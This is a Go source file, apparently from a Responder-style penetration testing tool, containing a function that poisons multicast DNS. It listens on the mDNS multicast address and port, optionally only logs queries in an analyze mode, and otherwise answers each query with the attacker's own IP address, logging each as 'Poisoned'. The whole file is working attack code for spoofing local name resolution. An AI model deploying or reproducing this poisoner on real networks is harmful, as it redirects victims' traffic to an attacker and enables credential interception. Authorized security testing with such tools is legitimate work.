package main

import (
	"net"
)

const mdnsMulticast = "224.0.0.251"
const mdnsPort = 5353

func poisonMDNS(ifaceIP net.IP) {
	iface, err := ifaceByIP(ifaceIP)
	if err != nil {
		logError("MDNS ifaceByIP: %v", err)
		return
	}

	group := &net.UDPAddr{IP: net.ParseIP(mdnsMulticast), Port: mdnsPort}
	conn, err := net.ListenMulticastUDP("udp4", iface, group)
	if err != nil {
		logError("MDNS multicast listen — %v (need root?)", err)
		return
	}
	defer conn.Close()

	logInfo("MDNS  listening on %s (UDP %d, multicast %s)", ifaceIP, mdnsPort, mdnsMulticast)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		pkt := buf[:n]
		name := parseLLMNRQuery(pkt) // same DNS wire format as LLMNR
		if name == "" {
			continue
		}
		// Skip mDNS meta-queries
		if name == "_DOSVC" || name == "wpad" || name == "WPAD" {
			continue
		}
		logVerbose("MDNS  query: %s from %s", name, src)
		if analyzeMode {
			logInfo("[MDNS] [Analyze] query for '%s' from %s", name, src)
			continue
		}
		if !shouldRespond(src, name) {
			logVerbose("MDNS skipping '%s' from %s (filter)", name, src)
			continue
		}
		resp := buildLLMNRResponse(pkt, ifaceIP)
		if resp != nil {
			conn.WriteTo(resp, src)
			logInfo("[MDNS] Poisoned query for '%s' — responding with %s", name, ifaceIP)
		}
	}
}
